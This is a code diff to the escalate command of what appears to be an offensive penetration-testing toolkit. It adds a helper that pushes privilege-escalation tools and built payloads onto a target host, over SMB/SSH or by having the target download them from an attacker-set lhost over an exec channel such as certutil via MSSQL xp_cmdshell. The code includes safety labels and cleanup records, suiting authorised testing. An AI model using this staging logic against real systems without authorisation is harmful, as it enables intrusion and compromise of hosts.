@@ -27,7 +27,8 @@ from . import (__version__, adcs as adcs_mod, arsenal as arsenal_mod,
                executor as executor_mod, hostenum as hostenum_mod, ingest as ingest_mod,
                kb as kb_mod, kerberos as kerberos_mod, lab as lab_mod,
                mssql as mssql_mod, poc as poc_mod, privesc as privesc_mod,
-               report as report_mod, scope as scope_mod, spray as spray_mod)
+               report as report_mod, scope as scope_mod, spray as spray_mod,
+               staging as staging_mod)
 from .errors import ConfirmationError, FieldkitError
 from .state import DB_ENV_VAR, Store, default_db_path
 
@@ -580,6 +581,34 @@ def cmd_escalate(args):
                                  detail=f"caught live during escalation on {args.host} "
                                         f"({now.date().isoformat()})")
 
+        def put_file(local, remote, label):
+            """Get `local` onto the target at `remote`. Tries --put-file (smb/ssh) first,
+            then falls back to download-staging (serve it, target fetches over the exec
+            transport — e.g. certutil over MSSQL xp_cmdshell). Returns (ok, note)."""
+            creates = [(f"{label} at {remote}", f"del {remote}")]
+            res = executor_mod.execute(
+                store, executor_mod.Action(
+                    host=host, cred=cred, command=None, label=label,
+                    safety="config-change", upload=(local, remote), creates=creates),
+                allow=allow, on_event=lambda m: print(m))
+            if not res.blocked and res.ok:
+                return True, "put-file"
+
+            def _exec(command):
+                return executor_mod.execute(
+                    store, executor_mod.Action(
+                        host=host, cred=cred, command=command, label=label,
+                        safety="config-change", creates=creates),
+                    allow=allow, on_event=lambda m: print(m))
+            dres = staging_mod.download_stage(host, local, remote, lhost=cfg.get("lhost"),
+                                              execute=_exec, on_event=lambda m: print(m))
+            if dres is None:
+                return False, (res.blocked or "no file-transfer path") + \
+                    " — set `config set lhost=<ip>` to download-stage over the exec transport"
+            if dres.blocked or not dres.ok:
+                return False, dres.blocked or "download-staging failed"
+            return True, "download"
+
         def stage(vector):
             done = []
             for name, remote in vector.stages:
@@ -587,16 +616,10 @@ def cmd_escalate(args):
                 if not local:
                     return escalate_mod.StageResult(
                         False, f"{name} not in the arsenal — `fieldkit arsenal` to fetch it")
-                act = executor_mod.Action(
-                    host=host, cred=cred, command=None, label=f"stage:{name}",
-                    safety="config-change", upload=(local, remote),
-                    creates=[(f"staged {name} at {remote}", f"del {remote}")])
-                res = executor_mod.execute(store, act, allow=allow,
-                                           on_event=lambda m: print(m))
-                if res.blocked or not res.ok:
-                    return escalate_mod.StageResult(
-                        False, res.blocked or f"upload of {name} failed")
-                done.append(f"{name}→{remote}")
+                ok, how = put_file(local, remote, f"stage:{name}")
+                if not ok:
+                    return escalate_mod.StageResult(False, how)
+                done.append(f"{name}→{remote} ({how})")
             return escalate_mod.StageResult(True, "staged " + ", ".join(done))
 
         arch = "x86" if cfg.get("arch") == "x86" else "x64"
@@ -611,16 +634,10 @@ def cmd_escalate(args):
                                      lhost=cfg.get("lhost"), lport=cfg.get("lport"))
                 if not bres.ok:
                     return escalate_mod.StageResult(False, bres.detail)
-                act = executor_mod.Action(
-                    host=host, cred=cred, command=None, label=f"build:{fmt}",
-                    safety="config-change", upload=(out, remote),
-                    creates=[(f"built {fmt} ({bres.tool}) at {remote}", f"del {remote}")])
-                res = executor_mod.execute(store, act, allow=allow,
-                                           on_event=lambda m: print(m))
-                if res.blocked or not res.ok:
-                    return escalate_mod.StageResult(
-                        False, res.blocked or f"upload of {fmt} failed")
-                done.append(f"{fmt}({bres.tool})→{remote}")
+                ok, how = put_file(out, remote, f"build:{fmt}")
+                if not ok:
+                    return escalate_mod.StageResult(False, how)
+                done.append(f"{fmt}({bres.tool})→{remote} ({how})")
             return escalate_mod.StageResult(True, "built+staged " + ", ".join(done))
 
         print("\n--- escalating ---")
